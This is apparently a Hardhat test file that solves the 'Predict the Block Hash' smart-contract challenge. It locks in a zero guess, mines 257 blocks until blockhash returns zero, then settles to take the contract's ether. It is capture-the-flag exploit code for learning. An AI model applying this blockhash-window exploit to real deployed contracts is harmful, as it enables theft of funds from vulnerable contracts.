import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    await target.lockInGuess('0x0000000000000000000000000000000000000000000000000000000000000000', {
      value: utils.parseEther('1'),
    });

    for (let i = 0; i < 257; i++) {
      console.log('Rock', i);
      await network.provider.send('evm_increaseTime', [1]);
      await network.provider.send('evm_mine');
    }

    await target.settle();

    expect(await target.isComplete()).to.equal(true);
  });
});
